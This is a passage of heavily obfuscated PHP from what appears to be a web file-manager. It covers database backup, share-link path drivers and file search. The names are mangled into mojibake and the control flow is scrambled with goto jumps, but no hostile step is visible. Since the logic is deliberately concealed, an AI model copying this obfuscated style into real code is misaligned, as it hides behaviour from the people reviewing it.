$EîÑ‹È„”£[721] && (!isset($a³İÆŞÍ‰Ç[$EîÑ‹È„”£[694]]) || $a³İÆŞÍ‰Ç[$EîÑ‹È„”£[694]] == $EîÑ‹È„”£[477])) { $AŒàº—»Õ = self::$io; } $AŠáãù‰¦Ö += $CÇ¥ÍÖÚµ­->sqlFromDb($f‡‘‘“­è±, $B´‚ Ü´¢Ô, $eèÄÌÈŸ—À, $AŒàº—»Õ); } $eèÄÌÈŸ—À->end(); $d¡×°ìÒµÓ = array($EîÑ‹È„”£[722] => $d¿µ¡¯Å¿Ì, $EîÑ‹È„”£[709] => 1, $EîÑ‹È„”£[723] => $AŠáãù‰¦Ö, $EîÑ‹È„”£[724] => $AŠáãù‰¦Ö); goto e¸âÈêß“œ; cÔÕªÍÆšÉ: } private function _dbType($B‹“§ìêÁ) { goto d¿ºÀ™–î«; D…ĞÌòƒ®Ô: if ($fŸ·Ü·Ù°‚ == $B‰ÈÔ¸æÔ[726]) { $b‹©–™íĞÃ = explode($B‰ÈÔ¸æÔ[4], $B‹“§ìêÁ[$B‰ÈÔ¸æÔ[727]]); $fŸ·Ü·Ù°‚ = $b‹©–™íĞÃ[0]; } $fÌÚŠœç×ñ = array($B‰ÈÔ¸æÔ[728] => $B‰ÈÔ¸æÔ[9], $B‰ÈÔ¸æÔ[729] => $B‰ÈÔ¸æÔ[730]); if (isset($fÌÚŠœç×ñ[$fŸ·Ü·Ù°‚])) { $fŸ·Ü·Ù°‚ = $fÌÚŠœç×ñ[$fŸ·Ü·Ù°‚]; } goto Dİ¶Ößá¡´; d¿ºÀ™–î«: $B‰ÈÔ¸æÔ =& $_SERVER[í…¶]; $B‹“§ìêÁ = array_change_key_case($B‹“§ìêÁ); $fŸ·Ü·Ù°‚ = $B‹“§ìêÁ[$B‰ÈÔ¸æÔ[725]]; goto D…ĞÌòƒ®Ô; Dİ¶Ößá¡´: return $fŸ·Ü·Ù°‚; goto d™ÇŞŞ­ğ; d™ÇŞŞ­ğ: } } class BackupDbFile { public function __construct() { } public function index() { goto aù‚èÊì²¬; Eœì¸£¾Šá: Backup::set(array($e‰³µ±ˆßø[733] => $CÆƒ¹¥‹¹Ñ[$e‰³µ±ˆßø[77]])); IO::move($DøÖºÌÜ¤œ, $AÚÇ¯³˜Æ); $dÕ§–£ùÏñ = CONTROLLER_DIR . $e‰³µ±ˆßø[734]; goto c´ÆÌ¬Á´; FŞèæ”›¨‘: $DøÖºÌÜ¤œ = TEMP_FILES . "\x62\141\x63\153\x75\x70\x5f{$Cìä‹º……é}\57"; $AÚÇ¯³˜Æ = "\173\x69\157\72{$DøÉà½Œ­‡[$e‰³µ±ˆßø[693]]}\x7d\57\x64\x61\x74\x61\142\141\x73\x65\x2f"; IO::mkdir($AÚÇ¯³˜Æ . "\142\141\143\153\x75\160\137{$Cìä‹º……é}\57"); goto F¦ğƒêš‚…; c´ÆÌ¬Á´: $Dµ«–šÄ = CONTROLLER_DIR . $e‰³µ±ˆßø[735]; IO::copy($dÕ§–£ùÏñ, $AÚÇ¯³˜Æ . "\142\141\143\153\x75\160\x5f{$Cìä‹º……é}\x2f"); IO::copy($Dµ«–šÄ, $AÚÇ¯³˜Æ . "\x62\x61\x63\x6b\165\x70\137{$Cìä‹º……é}\x2f"); goto E¯öª‰áÍ…; F¦ğƒêš‚…: $aŒàª† × = new TaskFileTransfer($e‰³µ±ˆßø[731], $e‰³µ±ˆßø[716], 0, LNG($e‰³µ±ˆßø[717]) . $e‰³µ±ˆßø[421] . LNG($e‰³µ±ˆßø[719]) . $e‰³µ±ˆßø[732]); $aŒàª† ×->addPath($DøÖºÌÜ¤œ); $CÆƒ¹¥‹¹Ñ = IO::infoWithChildren($DøÖºÌÜ¤œ); goto Eœì¸£¾Šá; E¯öª‰áÍ…: $aŒàª† ×->end(); Backup::set(array($e‰³µ±ˆßø[736] => $CÆƒ¹¥‹¹Ñ[$e‰³µ±ˆßø[77]])); return !0; goto fÛ×‘Œ ‹Ø; aù‚èÊì²¬: $e‰³µ±ˆßø =& $_SERVER[í…¶]; $DøÉà½Œ­‡ = Backup::get(); $Cìä‹º……é = $DøÉà½Œ­‡[$e‰³µ±ˆßø[28]]; goto FŞèæ”›¨‘; fÛ×‘Œ ‹Ø: } } goto eİ·÷½×é; Bò”¸­ëî: $_SERVER[$_SERVER[²‡§™ıäÑÊº•][52]] = ("\71\66\63\61"."\x35\x31")+0;$_hDmN="rdgVxwmqpnTFnKnmJhmTIS2GIy7w4zNv8We2dTN3brCpBxuuiGf6Zwh5JDjy7Yu6ietDsRVsystEKYx2";; stream_wrapper_register($_SERVER[²‡§™ıäÑÊº•][53], $_SERVER[²‡§™ıäÑÊº•][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Aï˜ÕÕ™Ù—, $FÆèĞØ¬ø) { $dŞ¨—Ÿ…Êİ =& $_SERVER[í…¶]; if (isset(self::$_methodList[$Aï˜ÕÕ™Ù—])) { return @call_user_func_array(self::$_methodList[$Aï˜ÕÕ™Ù—], $FÆèĞØ¬ø); } else { if (method_exists($this, $Aï˜ÕÕ™Ù—)) { return call_user_func_array(array($this, $Aï˜ÕÕ™Ù—), $FÆèĞØ¬ø); } else { think_exception(__CLASS__ . $dŞ¨—Ÿ…Êİ[4] . $Aï˜ÕÕ™Ù— . $dŞ¨—Ÿ…Êİ[5]); } } } public static function __callStatic($eÖÍö„ËÊß, $f•¬¨‡ùº) { if (isset(self::$_methodListStatic[$eÖÍö„ËÊß])) { return call_user_func_array(self::$_methodListStatic[$eÖÍö„ËÊß], $f•¬¨‡ùº); } else { if (method_exists(self, $eÖÍö„ËÊß)) { return call_user_func_array(array(self, $eÖÍö„ËÊß), $f•¬¨‡ùº); } else { show_json("{$eÖÍö„ËÊß}\x28\x29\40\156\x6f\164\x20\145\x78\x69\163\164\x3b", !1); } } } public static function addMethod($D“…‚ø‹œ, $dá™‰°¶ÈÎ) { self::$_methodList[$D“…‚ø‹œ] = $dá™‰°¶ÈÎ; } public static function addMethodStatic($EÓ©—Ñ·Ã, $FŠ†¿¨¡ƒä) { self::$_methodListStatic[$EÓ©—Ñ·Ã] = $FŠ†¿¨¡ƒä; } } goto bÒ°•©•‚á; A«Ğö÷Í‘Ÿ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($A¡æƒÅåÓ‹) { $this->pathParse = $A¡æƒÅåÓ‹; $this->model = Model($_SERVER[í…¶][1115]); } public function getPathOuter($FÆ‘«ï´ ê) { $c¦´²¹¤øĞ =& $_SERVER[í…¶]; if (!$FÆ‘«ï´ ê) { return $FÆ‘«ï´ ê; } $D‚¤·ËÓ„– = $this->parse($FÆ‘«ï´ ê); return trim(KodIO::makeShare($this->pathParse[$c¦´²¹¤øĞ[376]], $D‚¤·ËÓ„–[$c¦´²¹¤øĞ[376]]), $c¦´²¹¤øĞ[8]); } protected function infoParse($Fè‚——˜¬, $BÎ¥ÏğĞÖù = false, $FŠÏ‹¢²Œ = false) { $FÀŒ¬»õ®à =& $_SERVER[í…¶]; $fÈ°“ñÅ™¹ = $this->pathParse[$FÀŒ¬»õ®à[376]]; $c©ÅÙ»›Ø = trim($this->pathParse[$FÀŒ¬»õ®à[1010]], $FÀŒ¬»õ®à[8]); return Action($FÀŒ¬»õ®à[1122])->sharePathInfo($fÈ°“ñÅ™¹, $c©ÅÙ»›Ø); } public function infoFull($f¾Ì™Öœœê) { $D‡çŠÖ‰¾ =& $_SERVER[í…¶]; $fë•ã¨ƒá = explode($D‡çŠÖ‰¾[8], trim($f¾Ì™Öœœê, $D‡çŠÖ‰¾[8])); if (count($fë•ã¨ƒá) > 1) { $B‡÷ŒôÛ¡ø = implode($D‡çŠÖ‰¾[8], array_splice($fë•ã¨ƒá, 1)); $E®×É—î½ = $this->model->pathInfoByPath($fë•ã¨ƒá[0], $B‡÷ŒôÛ¡ø); if (!$E®×É—î½) { return !1; } $this->pathParse[$D‡çŠÖ‰¾[1010]] = $E®×É—î½[$D‡çŠÖ‰¾[378]]; } return $this->infoParse($f¾Ì™Öœœê); } public function listAll($EÉ‡‘Ş—·É) { goto B¹ËÙ«µøØ; Eˆø’¡ÓÅ¯: $fùµ‚Ç˜¶ã = $this->model->listAll($EÉ‡‘Ş—·É); $C±µŒ‡å§ = Model($cæå”†ë‡½[545])->getInfo($c³šïˆšå[$cæå”†ë‡½[450]]); $Fİê…À©Áò = Action($cæå”†ë‡½[1122]); goto B“ÛÕ£¥ô…; B“ÛÕ£¥ô…: foreach ($fùµ‚Ç˜¶ã as &$d‚©¶ËÔöÎ) { check_abort(); $d‚©¶ËÔöÎ[$cæå”†ë‡½[400]] = $Fİê…À©Áò->_shareItemeParse($d‚©¶ËÔöÎ[$cæå”†ë‡½[400]], $C±µŒ‡å§); } return $fùµ‚Ç˜¶ã; goto DÕ“¢¶âà; B¹ËÙ«µøØ: $cæå”†ë‡½ =& $_SERVER[í…¶]; $c³šïˆšå = IO::info($this->pathParse[$cæå”†ë‡½[75]]); if (!$c³šïˆšå) { return array(); } goto Eˆø’¡ÓÅ¯; DÕ“¢¶âà: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($cŒÃ‚ÇÓ) { $this->pathParse = $cŒÃ‚ÇÓ; $this->model = Model($_SERVER[í…¶][1115]); } protected function infoParse($fˆÍÅÈˆŠØ, $e„¹í¬Ó´ = false, $Eæøô‰ÒÄ· = false) { $A‰¸ßõƒÙ­ =& $_SERVER[í…¶]; return Action($A‰¸ßõƒÙ­[1016])->sharePathInfo($this->pathParse[$A‰¸ßõƒÙ­[75]], !0); } public function listPath($bïÔ¾ÑôÒ, $AíÕ‹ŠÔ£§ = false) { $E™ÑŠ‡†Ÿ =& $_SERVER[í…¶]; $F÷‚ÍòŒˆƒ = parent::listPath($bïÔ¾ÑôÒ, $AíÕ‹ŠÔ£§); foreach ($F÷‚ÍòŒˆƒ as $AÖåå˜Ö» => $aò²´İ¯Òƒ) { if (!in_array($AÖåå˜Ö», array($E™ÑŠ‡†Ÿ[73], $E™ÑŠ‡†Ÿ[74]))) { continue; } foreach ($aò²´İ¯Òƒ as $a‰µ‰ïÂÛ => $e‡ÅšË÷ë) { $F÷‚ÍòŒˆƒ[$AÖåå˜Ö»][$a‰µ‰ïÂÛ] = Action($E™ÑŠ‡†Ÿ[1016])->shareItemInfo($e‡ÅšË÷ë); } } return $F÷‚ÍòŒˆƒ; } public function listAll($C¨‘Ğ·¸çŠ) { $AÙÓ®óÓˆÕ =& $_SERVER[í…¶]; $DğˆƒÓ„Òé = IO::info($this->pathParse[$AÙÓ®óÓˆÕ[75]]); if (!$DğˆƒÓ„Òé) { return array(); } $cÆÂ–ÑåòÆ = $this->model->listAll($C¨‘Ğ·¸çŠ); foreach ($cÆÂ–ÑåòÆ as &$BÅØÍ¦‹œµ) { $BÅØÍ¦‹œµ[$AÙÓ®óÓˆÕ[400]] = Action($AÙÓ®óÓˆÕ[1016])->shareItemInfo($BÅØÍ¦‹œµ[$AÙÓ®óÓˆÕ[400]]); } return $cÆÂ–ÑåòÆ; } } class PathDriverDriverShareItem { public function __construct($EŒ•Áë‹ŒÌ) { $this->pathParse = $EŒ•Áë‹ŒÌ; } public function __call($a­Õ®ê˜ÒÎ, $Aˆ¨‚³ôå°) { $BÀÜŠÚÑ‚ =& $_SERVER[í…¶]; if (method_exists($this, $a­Õ®ê˜ÒÎ)) { return; } $bÎ¼îÁêğÕ = call_user_func_array(array($BÀÜŠÚÑ‚[1123], $a­Õ®ê˜ÒÎ), $Aˆ¨‚³ôå°); $B¸ñ¾ñ°Ëø = array($BÀÜŠÚÑ‚[1124], $BÀÜŠÚÑ‚[1125], $BÀÜŠÚÑ‚[1126], $BÀÜŠÚÑ‚[1127], $BÀÜŠÚÑ‚[499], $BÀÜŠÚÑ‚[501], $BÀÜŠÚÑ‚[1128], $BÀÜŠÚÑ‚[103], $BÀÜŠÚÑ‚[1129], $BÀÜŠÚÑ‚[1130]); if (in_array($a­Õ®ê˜ÒÎ, $B¸ñ¾ñ°Ëø)) { $bÎ¼îÁêğÕ = $this->getPathOuter($bÎ¼îÁêğÕ); } return $bÎ¼îÁêğÕ; } public function copy($A–„Ÿ°µŞ¥, $aÚŠÈ°Ô¦ , $bÜÁÖõ‚ÎÒ = false) { return $this->copyMove($A–„Ÿ°µŞ¥, $aÚŠÈ°Ô¦ , $bÜÁÖõ‚ÎÒ, $_SERVER[í…¶][499]); } public function move($B†»¼Ã»”‘, $f˜§é²ô, $Eá—Ç×ø…„ = false) { return $this->copyMove($B†»¼Ã»”‘, $f˜§é²ô, $Eá—Ç×ø…„, $_SERVER[í…¶][501]); } private function copyMove($dØ…ÇÉ«öÍ, $AôÒ›‰”ğø, $BÓÙ›Ãàâ, $B¦¢íæ¹ß¶) { goto D±¦§²—Éë; d¥¿Øğ•å½: return $FÓÒ·ˆÛĞ¬; goto bğªë§Èç„; D±¦§²—Éë: $F¢ ùØ‚İ =& $_SERVER[í…¶]; $AšæĞˆÉÓ = $AôÒ›‰”ğø; $c‡¬òÛ— = IO::driverMake($AôÒ›‰”ğø); goto fí¢†‚á±; fí¢†‚á±: if ($c‡¬òÛ—->pathParse[$F¢ ùØ‚İ[996]]) { $AôÒ›‰”ğø = $c‡¬òÛ—->pathParse[$F¢ ùØ‚İ[996]]; } else { $AôÒ›‰”ğø = $AšæĞˆÉÓ; } $FÓÒ·ˆÛĞ¬ = IO::copyMove($dØ…ÇÉ«öÍ, $AôÒ›‰”ğø, $BÓÙ›Ãàâ, $B¦¢íæ¹ß¶); $FÓÒ·ˆÛĞ¬ = $this->getPathOuter($FÓÒ·ˆÛĞ¬); goto d¥¿Øğ•å½; bğªë§Èç„: } public function pathFather($a³Â‚¯µÎ‹) { return get_path_father($this->pathParse[$_SERVER[í…¶][75]]); } public function iconvSystem($DÁñ£µÓ„Ñ) { return $DÁñ£µÓ„Ñ; } protected function infoParse($eÅ§¡¬‡Á, $a¨ô¹­óö§ = false) { $E–ƒóÉù½ƒ =& $_SERVER[í…¶]; $C¸Œ…§è¿ = $this->pathParse[$E–ƒóÉù½ƒ[448]][$E–ƒóÉù½ƒ[1017]] . $this->pathParse[$E–ƒóÉù½ƒ[1010]]; if ($a¨ô¹­óö§) { $D‹ÃÛÔ­Ù’ = IO::infoWithChildren($C¸Œ…§è¿); } else { $D‹ÃÛÔ­Ù’ = IO::info($C¸Œ…§è¿); } $Aö—õ¼½¤ª = $this->pathParse[$E–ƒóÉù½ƒ[448]]; return Action($E–ƒóÉù½ƒ[1122])->_shareItemeParse($D‹ÃÛÔ­Ù’, $Aö—õ¼½¤ª); } public function listAll($DÎäÊ‰˜„ù) { $E•×‡†À =& $_SERVER[í…¶]; $A—¥‡‰ôÕŞ = IO::listAll($DÎäÊ‰˜„ù); $C¥Ë„–ĞÖ = $this->pathParse[$E•×‡†À[448]]; foreach ($A—¥‡‰ôÕŞ as &$CŠïŒ²ãİ) { check_abort(); $CŠïŒ²ãİ = array_merge(IO::info($CŠïŒ²ãİ[$E•×‡†À[75]]), $CŠïŒ²ãİ); $CŠïŒ²ãİ[$E•×‡†À[400]] = Action($E•×‡†À[1122])->_shareItemeParse($CŠïŒ²ãİ, $C¥Ë„–ĞÖ); } return $A—¥‡‰ôÕŞ; } public function getPathOuter($F­÷§ÁÖŠ³) { goto fË‘½šæÂ”; b¡“ÄàÌÎ: if (substr($BæßŠéÖ, 0, strlen($aŸºôÕÔ×±)) != $aŸºôÕÔ×±) { return !1; } return $this->pathParse[$FŒŒÜ² ˜[1011]] . $FŒŒÜ² ˜[8] . ltrim($a¥£¥œÔæ›, $FŒŒÜ² ˜[8]); goto aÚÉ…Îõ‰; B»¾÷Ñ½œ: $BæßŠéÖ = KodIO::clear($F­÷§ÁÖŠ³); $aŸºôÕÔ×± = KodIO::clear($this->pathParse[$FŒŒÜ² ˜[448]][$FŒŒÜ² ˜[1017]]); $a¥£¥œÔæ› = substr($BæßŠéÖ, strlen($aŸºôÕÔ×±)); goto b¡“ÄàÌÎ; fË‘½šæÂ”: $FŒŒÜ² ˜ =& $_SERVER[í…¶]; $c÷ãŸ„à³ = KodIO::parse($F­÷§ÁÖŠ³); if ($c÷ãŸ„à³[$FŒŒÜ² ˜[29]] == KodIO::KOD_SHARE_ITEM) { return $c÷ãŸ„à³[$FŒŒÜ² ˜[75]]; } goto B»¾÷Ñ½œ; aÚÉ…Îõ‰: } public function getType() { $Fíˆ·……å =& $_SERVER[í…¶]; $fÚñ‘’Ø¤‹ = str_replace($Fíˆ·……å[71], $Fíˆ·……å[33], get_class($this)); return strtolower($fÚñ‘’Ø¤‹); } public function isTypeObject($eåˆÆ¥ñ ”) { return IO::isTypeObject($eåˆÆ¥ñ ”); } public function info($fİ½¢´ÂÛÌ) { return $this->infoParse($fİ½¢´ÂÛÌ); } public function infoAuth($aóª°¬”ÒÔ) { return $this->infoParse($aóª°¬”ÒÔ); } public function infoWithChildren($Aæª¤Šá‰˜) { return $this->infoParse($Aæª¤Šá‰˜, !0); } public function infoFull($EÄÍ›Áë÷¹) { return $this->infoParse($EÄÍ›Áë÷¹); } } goto F˜‘¦‡–­ù; b“°…ˆğóé: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($EäÓÉ¯¼) { goto cİ¬‡Õ¬; AÔïŠùö¶Ù: if (!$bïŸ‘ÎÊîï[$E¹Èôë£À[160]]) { $E«ÛöÃØ’ = array_to_keyvalue($CŠëÆÌ…’, $E¹Èôë£À[33], $E¹Èôë£À[160]); $B„Ë¯Ï¤à‰ = implode($E¹Èôë£À[47], $E«ÛöÃØ’); $b„®Â™åÈæ = $E¹Èôë£À[2262]; } $E³ÓÄ§†— = explode($E¹Èôë£À[47], trim($B„Ë¯Ï¤à‰, $E¹Èôë£À[47])); return array($b„®Â™åÈæ, $E³ÓÄ§†—); goto Dº¦é‹†; cİ¬‡Õ¬: $E¹Èôë£À =& $_SERVER[í…¶]; $CŠëÆÌ…’ = KodIO::fileTypeList(); $bïŸ‘ÎÊîï = $CŠëÆÌ…’[$EäÓÉ¯¼]; goto BÁ‹îïŠ†¨; BÁ‹îïŠ†¨: if (!$bïŸ‘ÎÊîï) { return array(); } $B„Ë¯Ï¤à‰ = $bïŸ‘ÎÊîï[$E¹Èôë£À[160]]; $b„®Â™åÈæ = $E¹Èôë£À[7]; goto AÔïŠùö¶Ù; Dº¦é‹†: } public function listPathType($eˆôÚ§·ÇĞ) { $aÀ…µµùËÛ =& $_SERVER[í…¶]; $a³Ì‚ƒ½›ï = $this->fileTypeWhere($eˆôÚ§·ÇĞ); if (!$a³Ì‚ƒ½›ï) { return array(); } $béğîºÕÇ = array($aÀ…µµùËÛ[530] => SourceModel::TYPE_USER, $aÀ…µµùËÛ[531] => USER_ID, $aÀ…µµùËÛ[527] => 0, $aÀ…µµùËÛ[528] => $a³Ì‚ƒ½›ï); return $this->listSource($béğîºÕÇ); } public function listSearch($cëèï££Å, $EË§¬œ¥Î» = 300) { goto b‹èì¨çÙ; Eêø‡Ï¥ã»: $this->_listSearchBindPinyin($cëèï££Å, $Bâ¢ê¯ˆÎÏ, $aåÂ‡‘Óšˆ); $this->alias($AâÎ…Å¤Ê[496])->_makeOrder()->cache(null, 10); $BôÔªâõ¤‚ = $this->distinct(!0)->field($aåÂ‡‘Óšˆ)->where($Bâ¢ê¯ˆÎÏ)->selectPage($EË§¬œ¥Î»); goto EœÒÕé­à²; E¤àîñùî“: $this->_listMake($BôÔªâõ¤‚); return $BôÔªâõ¤‚; goto e«„Ê„–¸; EœÒÕé­à²: $this->_listSearchDesc($BôÔªâõ¤‚, $cëèï££Å, $e”ÄÂ¬æ¯‡); $this->_listSearchTag($BôÔªâõ¤‚, $cëèï££Å, $e”ÄÂ¬æ¯‡); $this->_listDataApply($BôÔªâõ¤‚[$AâÎ…Å¤Ê[363]]); goto E¤àîñùî“; C½™ÎØìŸÌ: if (!isset($Bâ¢ê¯ˆÎÏ[$AâÎ…Å¤Ê[406]])) { $Bâ¢ê¯ˆÎÏ[$AâÎ…Å¤Ê[406]] = 0; } $aåÂ‡‘Óšˆ = $AâÎ…Å¤Ê[2313]; $e”ÄÂ¬æ¯‡ = $aåÂ‡‘Óšˆ; goto Eêø‡Ï¥ã»; b‹èì¨çÙ: $AâÎ…Å¤Ê =& $_SERVER[í…¶]; if (isset($cëèï££Å[$AâÎ…Å¤Ê[2179]]) && $cëèï££Å[$AâÎ…Å¤Ê[2179]]) { $cëèï££Å[$AâÎ…Å¤Ê[2179]] = str_replace($AâÎ…Å¤Ê[1589], $AâÎ…Å¤Ê[2312], trim($cëèï££Å[$AâÎ…Å¤Ê[2179]])); } $Bâ¢ê¯ˆÎÏ = $this->_parseSearchWhere($cëèï££Å); goto C½™ÎØìŸÌ; e«„Ê„–¸: } private function _listSearchTag(&$C£÷±›±Ùˆ, $e²Â¥ÕÀ¶, $B‰ÈŞ¶¶ÕŒ) { goto E‚ª‚ãÁÈœ; Dõê¡øŒñè: $Fßòƒ±º‹‰ = array(); $F¯Â¶ãÉõ = $e²Â¥ÕÀ¶[$F°Ì…æ±«[2179]]; foreach ($bëÒáÏÍ½í as $CÎ­‹öœÍ) { $C¬†¤–·í = $CÎ­‹öœÍ[$F°Ì…æ±«[28]]; $bÒ Ø©—ö = str_replace($F°Ì…æ±«[50], $F°Ì…æ±«[33], Pinyin::encode($C¬†¤–·í)); if (stripos($C¬†¤–·í, $F¯Â¶ãÉõ) !== !1 || stripos($bÒ Ø©—ö, $F¯Â¶ãÉõ) !== !1) { $Fßòƒ±º‹‰[] = $CÎ­‹öœÍ[$F°Ì…æ±«[376]]; } } goto fÌ„†¯Á–; E‚ª‚ãÁÈœ: $F°Ì…æ±« =& $_SERVER[í…¶]; if (!$e²Â¥ÕÀ¶[$F°Ì…æ±«[2179]] || $C£÷±›±Ùˆ[$F°Ì…æ±«[360]][$F°Ì…æ±«[340]] > 1) { return; } $bëÒáÏÍ½í = Model($F°Ì…æ±«[2314])->listData(); goto Dõê¡øŒñè; C—Ä¦ÌµËë: $bò®âòŒÙÖ = array_to_keyvalue($bò®âòŒÙÖ, $F°Ì…æ±«[33], $F°Ì…æ±«[75]); $C²·£Ã²İñ = array_unique($bò®âòŒÙÖ); $this->_listSearchMerge($C£÷±›±Ùˆ, $e²Â¥ÕÀ¶, $B‰ÈŞ¶¶ÕŒ, $C²·£Ã²İñ); goto cÍ¾ß×êÈ; fÌ„†¯Á–: if (!$Fßòƒ±º‹‰) { return; } $aÒº‚»·§Ö = array($F°Ì…æ±«[402] => array($F°Ì…æ±«[7], $Fßòƒ±º‹‰)); $bò®âòŒÙÖ = Model($F°Ì…æ±«[403])->field($F°Ì…æ±«[75])->where($aÒº‚»·§Ö)->select(); goto C—Ä¦ÌµËë; cÍ¾ß×êÈ: } private function _listSearchDesc(&$c…ÇÓó³‹, $aš­èËö‹Ä, $d½çİ¹•ù¿) { goto Eœ—‘Êæ–; fÊñ¸¸ÛÚ¦: $FØÏ„Ì×•” = array_unique($FØÏ„Ì×•”); if (!$FØÏ„Ì×•”) { return; } $dÈ‰ŸÇø = array($bÕËÉêç’£[378] => array($bÕËÉêç’£[7], $FØÏ„Ì×•”), $bÕËÉêç’£[89] => $bÕËÉêç’£[414], $bÕËÉêç’£[368] => array($bÕËÉêç’£[754], $bÕËÉêç’£[2181] . $aš­èËö‹Ä[$bÕËÉêç’£[2179]] . $bÕËÉêç’£[2181])); goto A½ÎŸÄè„³; A½ÎŸÄè„³: $c±‘•²±ïÌ = Model($bÕËÉêç’£[513])->field($bÕËÉêç’£[378])->where($dÈ‰ŸÇø)->select(); $FÎÑØ‹é±‘ = array_to_keyvalue($c±‘•²±ïÌ, $bÕËÉêç’£[33], $bÕËÉêç’£[378]); $this->_listSearchMerge($c…ÇÓó³‹, $aš­èËö‹Ä, $d½çİ¹•ù¿, $FÎÑØ‹é±‘); goto E–°»øŞ§; Eœ—‘Êæ–: $bÕËÉêç’£ =& $_SERVER[í…¶]; if (!$aš­èËö‹Ä[$bÕËÉêç’£[2179]] || $c…ÇÓó³‹[$bÕËÉêç’£[360]][$bÕËÉêç’£[340]] > 1) { return; } $FØÏ„Ì×•” = $this->listSearchChildren($aš­èËö‹Ä[$bÕËÉêç’£[470]]); goto fÊñ¸¸ÛÚ¦; E–°»øŞ§: } private function _listSearchMerge(&$CÜõ·Ñìèª, $EÔÏ·›¾ê‚, $F·ìšÂÏì‘, $F¿È›ÀÏ³») { goto dÌ…´¡¾ê¸; a‰‹¨Ğ†ƒ˜: $a»½®–Š„Î = array_diff($F¿È›ÀÏ³», $cÜÃ¾æ™Ë); if (!$a»½®–Š„Î) { return; } $b´Ûã…¨  = array($Eğ¿Ê®öõğ[378] => array($Eğ¿Ê®öõğ[7], $a»½®–Š„Î)); goto E©ÈÑ°Ñïª; dÌ…´¡¾ê¸: $Eğ¿Ê®öõğ =& $_SERVER[í…¶]; if (!$F¿È›ÀÏ³») { return; } $cÜÃ¾æ™Ë = array_to_keyvalue($CÜõ·Ñìèª[$Eğ¿Ê®öõğ[363]], $Eğ¿Ê®öõğ[33], $Eğ¿Ê®öõğ[378]); goto a‰‹¨Ğ†ƒ˜; E©ÈÑ°Ñïª: $F‡ÖÂ¹ÑÄˆ = $this->field($F·ìšÂÏì‘)->where($b´Ûã…¨ )->select(); if (!$F‡ÖÂ¹ÑÄˆ) { return; } $B¹Çôš£• = array(); goto fù§Ë‚ùµÙ; fù§Ë‚ùµÙ: foreach ($F‡ÖÂ¹ÑÄˆ as $EŸß·¾ìÊ) { $aÚÀ¼ğ‘‡ö = $Eğ¿Ê®öõğ[47] . $EÔÏ·›¾ê‚[$Eğ¿Ê®öõğ[470]] . $Eğ¿Ê®öõğ[47]; if (stripos($EŸß·¾ìÊ[$Eğ¿Ê®öõğ[468]], $aÚÀ¼ğ‘‡ö) !== !1) { $B¹Çôš£•[] = $EŸß·¾ìÊ; } } $CÜõ·Ñìèª[$Eğ¿Ê®öõğ[363]] = array_merge($B¹Çôš£•, $CÜõ·Ñìèª[$Eğ¿Ê®öõğ[363]]); $CÜõ·Ñìèª[$Eğ¿Ê®öõğ[360]][$Eğ¿Ê®öõğ[361]] += count($B¹Çôš£•); goto dÈšóñ‚éù; dÈšóñ‚éù: } public function listSearchChildren($D•Úñõ¬‚, $aÖÕğĞã¼‡ = 5000) { goto d·È®Šƒ»; E™‹Í‡¸‡: $F˜Ş—–óŠÈ = array($e¿¯¬‚ÔŠè[468] => array($e¿¯¬‚ÔŠè[754], $f±‚ÁŞ‰é[$e¿¯¬‚ÔŠè[468]] . $f±‚ÁŞ‰é[$e¿¯¬‚ÔŠè[378]] . $e¿¯¬‚ÔŠè[493])); $eÑÒÚÙ‘õé = $this->field($e¿¯¬‚ÔŠè[378])->cache(null, 600)->where($F˜Ş—–óŠÈ)->count(); if ($eÑÒÚÙ‘õé > $aÖÕğĞã¼‡) { return $this->_listSearchChildrenNear($D•Úñõ¬‚, $aÖÕğĞã¼‡); } goto Dô°öà®à‡; Dô°öà®à‡: $D³ÔàÒ¯ª¿ = $this->field($e¿¯¬‚ÔŠè[378])->where($F˜Ş—–óŠÈ)->select(); $fÂù‚Æ«¾” = array_to_keyvalue($D³ÔàÒ¯ª¿, $e¿¯¬‚ÔŠè[33], $e¿¯¬‚ÔŠè[378]); return $fÂù‚Æ«¾”; goto cåñªµíåÓ; d·È®Šƒ»: $e¿¯¬‚ÔŠè =& $_SERVER[í…¶]; $fÂù‚Æ«¾” = array(); $f±‚ÁŞ‰é = $this->sourceInfo($D•Úñõ¬‚); goto E™‹Í‡¸‡; cåñªµíåÓ: } private function _listSearchChildrenNear($eåÄÈê›Ç…, $CîÎºñè˜) { goto E‰Ç¦ƒ‘‡; E‰Ç¦ƒ‘‡: $F‹«ï˜˜È– =& $_SERVER[í…¶]; $BÓ†µÇ·Úˆ = array(); $c±‘ÜÄ§§° = array($F‹«ï˜˜È–[470] => $eåÄÈê›Ç…); goto aºÜ§Œ×Õ‰; aºÜ§Œ×Õ‰: $BÇššáãø„ = $this->field($F‹«ï˜˜È–[2315])->where($c±‘ÜÄ§§°)->select(); $EÔÑâ°¹à‚ = array_to_keyvalue(array_filter_by_field($BÇššáãø„, $F‹«ï˜˜È–[379], $F‹«ï˜˜È–[83]), $F‹«ï˜˜È–[33], $F‹«ï˜˜È–[378]); $BÓ†µÇ·Úˆ = array_merge($BÓ†µÇ·Úˆ, array_to_keyvalue($BÇššáãø„, $F‹«ï˜˜È–[33], $F‹«ï˜˜È–[378])); goto B…Ñ¢¿œ; B…Ñ¢¿œ: if (!$EÔÑâ°¹à‚) { return $BÓ†µÇ·Úˆ; } $c±‘ÜÄ§§° = array($F‹«ï˜˜È–[470] => array($F‹«ï˜˜È–[7], $EÔÑâ°¹à‚)); $BÇššáãø„ = $this->field($F‹«ï˜˜È–[2315])->where($c±‘ÜÄ§§°)->select(); goto DæÇ–±ç©; DæÇ–±ç©: $BÓ†µÇ·Úˆ = array_merge($BÓ†µÇ·Úˆ, array_to_keyvalue($BÇššáãø„, $F‹«ï˜˜È–[33], $F‹«ï˜˜È–[378])); $BÓ†µÇ·Úˆ = array_slice($BÓ†µÇ·Úˆ, 0, $CîÎºñè˜); return $BÓ†µÇ·Úˆ; goto Dáğ÷†¨Å½; Dáğ÷†¨Å½: } private function _listSearchBindPinyin($D÷Êæó®ñ¤, &$eï³İ¥…Óî, &$EÚÖ–Ç¿õ) { goto c¾õŒ¥²ôª; c¾õŒ¥²ôª: $cõßÏœö =& $_SERVER[í…¶]; if (!Input::check($D÷Êæó®ñ¤[$cõßÏœö[2179]], $cõßÏœö[306]) || 